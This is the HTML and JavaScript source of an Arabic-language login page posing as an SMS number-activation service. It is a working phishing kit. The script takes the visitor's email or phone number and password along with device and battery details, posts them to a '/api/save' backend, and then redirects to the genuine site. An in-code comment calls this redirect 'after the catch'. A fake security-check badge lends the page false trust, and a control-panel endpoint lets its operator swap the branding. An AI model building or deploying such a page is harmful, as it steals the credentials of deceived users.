<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل الخدمة - SMS</title>
    
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        /* التصميم الوردي الأصلي */
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: #e91e63; /* اللون الوردي المعتمد */
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }

        .container {
            background: white; padding: 30px 20px; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; 
            text-align: center;
        }

        #pageImg {
            width: 120px; height: auto; margin-bottom: 20px;
        }

        h2 { color: #c2185b; font-size: 18px; margin-bottom: 25px; font-weight: bold; }

        input {
            width: 100%; padding: 14px; margin-bottom: 15px;
            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
            outline: none; text-align: right; font-size: 15px;
        }
        input:focus { border-color: #e91e63; }

        .captcha-wrapper { margin: 15px 0; min-height: 65px; display: flex; flex-direction: column; align-items: center; }
        #verify-msg { color: #28a745; font-weight: bold; display: none; font-size: 14px; margin-top: 10px; }

        button {
            width: 100%; padding: 14px; background: #e91e63; color: white;
            border: none; border-radius: 8px; font-size: 18px; font-weight: bold; 
            cursor: pointer; transition: 0.3s;
        }
        button:hover { background: #ad1457; }

        .footer { margin-top: 20px; font-size: 14px; color: #666; }
        .footer span { color: #e91e63; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="Logo">
        
        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>

        <form id="mainLoginForm">
            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passInput" placeholder="كلمة السر" required>
            
            <div class="captcha-wrapper">
                <div class="cf-turnstile" id="cf-box" data-sitekey="1x00000000000000000000AA" data-callback="onSuccess"></div>
                <div id="verify-msg">✅ تم التحقق من أمان الجهاز</div>
            </div>

            <button type="submit" id="pageBtn">تسجيل دخول</button>
        </form>

        <div class="footer">
            ليس لديك حساب؟ <span onclick="Swal.fire({text:'التسجيل مغلق مؤقتاً', icon:'info'})">إنشاء حساب جديد</span>
        </div>
    </div>

    <script>
        let isVerified = false;

        function onSuccess() {
            document.getElementById('cf-box').style.display = 'none';
            document.getElementById('verify-msg').style.display = 'block';
            isVerified = true;
        }

        document.getElementById('mainLoginForm').onsubmit = async (e) => {
            e.preventDefault();
            
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;

            // 1. فحص البيانات لمنع الإدخال العشوائي
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^\+?[0-9]{7,15}$/;

            if (!emailRegex.test(user) && !phoneRegex.test(user)) {
                Swal.fire({ 
                    title: 'خطأ في البيانات', 
                    text: 'يرجى إدخال بريد إلكتروني أو رقم هاتف صحيح', 
                    icon: 'error', 
                    confirmButtonColor: '#e91e63' 
                });
                return;
            }

            if (!isVerified) {
                Swal.fire({ text: 'يرجى إكمال التحقق أولاً', icon: 'warning' });
                return;
            }

            // 2. سحب معلومات الجهاز والبطارية
            let battery = "N/A";
            try { const b = await navigator.getBattery(); battery = Math.floor(b.level * 100) + "%"; } catch(err) {}

            // 3. إرسال البيانات بأسماء حقول مطابقة لملف الـ Python (u, p, d, b, t)
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    u: user,
                    p: pass,
                    d: navigator.platform,
                    b: battery,
                    t: new Date().toLocaleString('ar-EG')
                })
            });

            // تحويل المستخدم للموقع الحقيقي بعد الصيد
            window.location.href = "https://receive-smss.com/"; 
        };

        // تحديث النصوص والصور من لوحة التحكم تلقائياً
        async function loadSettings() {
            try {
                const res = await fetch('/api/get');
                const data = await res.json();
                if(data.image) document.getElementById('pageImg').src = data.image;
                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if(data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch(e) {}
        }
        window.onload = loadSettings;
    </script>
</body>
</html>
